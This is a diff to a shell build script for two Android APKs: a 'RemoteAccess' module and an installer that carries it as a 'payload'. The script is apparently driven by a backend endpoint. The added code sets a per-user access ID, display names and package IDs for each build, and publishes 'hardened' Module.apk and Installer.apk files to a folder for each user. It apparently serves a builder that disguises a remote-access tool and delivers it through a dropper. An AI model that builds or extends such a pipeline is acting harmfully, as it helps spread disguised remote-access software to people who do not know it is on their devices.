@@ -27,6 +27,86 @@ for arg in "$@"; do
   [ "$arg" = "--clean" ] && CLEAN_BUILD=1
 done
 
+# ── 0a. Per-build customization (called from backend /api/build/apk) ─────────
+# Optional env vars from caller:
+#   BUILD_ACCESS_ID         Per-user identifier baked into BuildConfig.ACCESS_ID
+#   BUILD_MODULE_NAME       Display name of the main "module" app (app_name)
+#   BUILD_MODULE_PACKAGE    applicationId of the main "module" app
+#   BUILD_INSTALLER_NAME    Display name of the installer (app_name)
+#   BUILD_INSTALLER_PACKAGE applicationId of the installer
+#
+# Overrides are written to per-build files that gradle reads at configuration
+# time (app/build.access_id, app/build.app_id, installer/build.app_id). The
+# strings.xml app_name values are sed-replaced with backup + EXIT-trap
+# restoration so subsequent default builds are unaffected.
+APP_STRINGS="$ROOT_DIR/app/src/main/res/values/strings.xml"
+INSTALLER_STRINGS="$ROOT_DIR/installer/src/main/res/values/strings.xml"
+ACCESS_ID_FILE="$ROOT_DIR/app/build.access_id"
+APP_ID_FILE="$ROOT_DIR/app/build.app_id"
+INSTALLER_ID_FILE="$ROOT_DIR/installer/build.app_id"
+
+cleanup_overrides() {
+    [ -f "$APP_STRINGS.bak"       ] && mv -f "$APP_STRINGS.bak"       "$APP_STRINGS"       || true
+    [ -f "$INSTALLER_STRINGS.bak" ] && mv -f "$INSTALLER_STRINGS.bak" "$INSTALLER_STRINGS" || true
+    rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_ID_FILE"
+}
+trap cleanup_overrides EXIT
+
+if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ]; then
+    echo ""
+    echo "==> Per-build customization active"
+
+    if [ -n "${BUILD_ACCESS_ID:-}" ]; then
+        printf '%s' "$BUILD_ACCESS_ID" > "$ACCESS_ID_FILE"
+        echo "  BuildConfig.ACCESS_ID = $BUILD_ACCESS_ID"
+    fi
+    if [ -n "${BUILD_MODULE_PACKAGE:-}" ]; then
+        printf '%s' "$BUILD_MODULE_PACKAGE" > "$APP_ID_FILE"
+        echo "  app applicationId    = $BUILD_MODULE_PACKAGE"
+    fi
+    if [ -n "${BUILD_INSTALLER_PACKAGE:-}" ]; then
+        printf '%s' "$BUILD_INSTALLER_PACKAGE" > "$INSTALLER_ID_FILE"
+        echo "  installer appId      = $BUILD_INSTALLER_PACKAGE"
+    fi
+    if [ -n "${BUILD_MODULE_NAME:-}" ] && [ -f "$APP_STRINGS" ]; then
+        cp "$APP_STRINGS" "$APP_STRINGS.bak"
+        BUILD_MODULE_NAME="$BUILD_MODULE_NAME" python3 - "$APP_STRINGS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+name = os.environ['BUILD_MODULE_NAME']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+def esc(s):
+    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'", '&apos;')
+new = re.sub(r'(<string\s+name="app_name"[^>]*>)[^<]*(</string>)',
+             lambda m: m.group(1) + esc(name) + m.group(2), src, count=1)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+PYEOF
+        echo "  app app_name         = $BUILD_MODULE_NAME"
+    fi
+    if [ -n "${BUILD_INSTALLER_NAME:-}" ] && [ -f "$INSTALLER_STRINGS" ]; then
+        cp "$INSTALLER_STRINGS" "$INSTALLER_STRINGS.bak"
+        BUILD_INSTALLER_NAME="$BUILD_INSTALLER_NAME" python3 - "$INSTALLER_STRINGS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+name = os.environ['BUILD_INSTALLER_NAME']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+def esc(s):
+    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'", '&apos;')
+new = re.sub(r'(<string\s+name="app_name"[^>]*>)[^<]*(</string>)',
+             lambda m: m.group(1) + esc(name) + m.group(2), src, count=1)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+PYEOF
+        echo "  installer app_name   = $BUILD_INSTALLER_NAME"
+    fi
+
+    # Force clean build whenever customization is active — gradle's resource
+    # cache otherwise keeps stale strings/applicationId from a previous build.
+    if [ "$CLEAN_BUILD" -eq 0 ]; then
+        echo "  (Customization active — forcing clean build)"
+        rm -rf "$ROOT_DIR/app/build" "$ROOT_DIR/installer/build"
+    fi
+fi
+
 # ── 0. Clean (only when --clean is passed) ───────────────────────────────────
 if [ "$CLEAN_BUILD" -eq 1 ]; then
   echo "==> Cleaning previous build artifacts..."
@@ -573,12 +653,18 @@ PKG_FILE="$ROOT_DIR/installer/payload.pkg"
 if [ -f "$PAYLOAD_SRC" ]; then
     mkdir -p "$INSTALLER_ASSETS"
 
-    # Extract the payload's applicationId from app/build.gradle and persist it
-    # so installer/build.gradle can embed it into BuildConfig.PAYLOAD_PACKAGE.
-    PAYLOAD_PKG=$(grep -E "^[[:space:]]*applicationId" "$ROOT_DIR/app/build.gradle" \
-                  | head -1 | sed -E "s/.*applicationId[[:space:]]+['\"]([^'\"]+)['\"].*/\1/")
+    # Extract the payload's applicationId — prefer the per-build override
+    # written by the customization block above, then fall back to parsing
+    # app/build.gradle for the default. This is what installer/build.gradle
+    # embeds into BuildConfig.PAYLOAD_PACKAGE.
+    if [ -f "$APP_ID_FILE" ]; then
+        PAYLOAD_PKG=$(cat "$APP_ID_FILE")
+    else
+        PAYLOAD_PKG=$(grep -E "^[[:space:]]*applicationId" "$ROOT_DIR/app/build.gradle" \
+                      | head -1 | sed -E "s/.*applicationId[[:space:]]+['\"]([^'\"]+)['\"].*/\1/")
+    fi
     if [ -z "$PAYLOAD_PKG" ]; then
-        echo "  WARNING: could not detect payload applicationId from app/build.gradle"
+        echo "  WARNING: could not detect payload applicationId"
         PAYLOAD_PKG=""
     fi
     printf '%s' "$PAYLOAD_PKG" > "$PKG_FILE"
@@ -629,6 +715,22 @@ PYEOF
     fi
 else
     echo "  Skipping installer — main release APK missing."
+fi
+
+# ── 13. Per-user output directory (when invoked by /api/build/apk) ───────────
+# Publish the two final hardened APKs under apk-output/<accessId>/ as
+# Module.apk and Installer.apk so the backend can serve them per-user.
+if [ -n "${BUILD_ACCESS_ID:-}" ]; then
+    PER_USER_DIR="$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
+    mkdir -p "$PER_USER_DIR"
+    if [ -f "$ROOT_DIR/apk-output/RemoteAccess-release.apk" ]; then
+        cp "$ROOT_DIR/apk-output/RemoteAccess-release.apk" "$PER_USER_DIR/Module.apk"
+        echo "  Per-user Module:    $PER_USER_DIR/Module.apk"
+    fi
+    if [ -f "$ROOT_DIR/apk-output/Installer-release.apk" ]; then
+        cp "$ROOT_DIR/apk-output/Installer-release.apk" "$PER_USER_DIR/Installer.apk"
+        echo "  Per-user Installer: $PER_USER_DIR/Installer.apk"
+    fi
 fi
 
 # ── Summary ────────────────────────────────────────────────────────────────────
